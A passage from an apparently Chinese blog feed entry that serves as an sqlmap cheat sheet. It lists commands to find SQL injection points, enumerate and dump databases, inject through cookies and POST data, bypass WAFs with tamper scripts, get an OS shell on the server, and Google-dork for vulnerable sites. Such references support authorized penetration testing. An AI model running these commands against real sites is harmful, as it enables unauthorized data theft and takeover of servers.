/*–dump为拆解字段名会保存在sqlmap/output目录下*/</code></p><p><strong>2.MYSQL数据库：</strong></p><p><code>sqlmap.py -u “url” /*扫描注入点*/</code></p><p><code>sqlmap.py -u “url” –dbs /*列出所有数据库*/</code></p><p><code>sqlmap.py -u “url” –current-db /*列出当前数据库*/</code></p><p><code>sqlmap.py -u “url” –current-user /*列出当前用户*/</code></p><p><code>sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/</code></p><p><code>sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/</code></p><p><code>sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”</code></p><p><strong>3.SQLSERVER数据库：</strong></p><p><code>&lt;!--sqlmap.py -u “url” /*扫描注入点*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –dbs /*列出所有数据库*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –current-db /*列出当前数据库*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –current-user /*列出当前用户*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”--&gt;</code></p><p><code>&lt;!--SQLSERVER操作和MYSQL是一样的！！！常见的几种数据库！！！--&gt;</code></p><p><strong>4.COOKIE注入：</strong></p><p><code>sqlmap.py -u “[www.xxx.com/asp](http://www.xxx.com/asp)或者[www.xxx.com/php](http://www.xxx.com/php)” –cookie</code> “参数名如id=1” –level 2/<em>level为提升权限</em>/</p><p>什么数据库就按照上面的数据库加上cookie语句拆解就行了</p><p><strong>5.POST注入：</strong></p><p>抓包保存到SQLMAP目录下.txt的文件然后输入指令sqlmap.py -r xxx.txt /*xxx.txt为保存包文件的文件名”</p><p><code>sqlmap.py -u “url” –data “POST参数”</code></p><p><strong>6.执行shell命令：</strong></p><p><code>sqlmap.py -u “url” –os-cmd=”net user” /*执行net user命令*/</code></p><p><code>sqlmap.py -u “url” –os-shell /*系统交互的shell*/</code></p><p><strong>7.注入HTTP请求 :</strong></p><p><code>sqlmap.py -r xxx.txt –dbs /*xxx.txt内容为HTTP请求*/</code></p><p><strong>8.绕过WAF的tamper插件使用：</strong></p><p><code>sqlmap.py -u “url” –tamper “xxx.py”</code></p><p><code>sqlmap.py -u “url” –tamper=”xxx.py”</code></p><p><strong>9.将注入语句插入到指定位置：</strong></p><p><code>sqlmap.py -u “url([www.xxx.com/id/1](http://www.xxx.com/id/1)*.html)” –dbs</code></p><p>有些网站是采用伪静态的页面使用SQLMAP的普通注入是不行的，所以SQLMAP提供了”*”参数将SQL语句插入指定位置，一般用于伪静态注入。</p><p>在使用HTTP注入时使用-r参数也可以直接在文本中添加*号</p><p><strong>10.延时注入：</strong></p><p><code>sqlmap –dbs -u “url” –delay 0.5 /*延时0.5秒*/</code></p><p><code>sqlmap –dbs -u “url” –safe-freq /*请求2次*/</code></p><p><strong>11.使用谷歌语法搜索注入(Google hack)：</strong></p><p><code>sqlmap.py -g “inurl:asp?id=1” /*””内为搜索语法，如：inurl,intitle,site,filetype</code></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
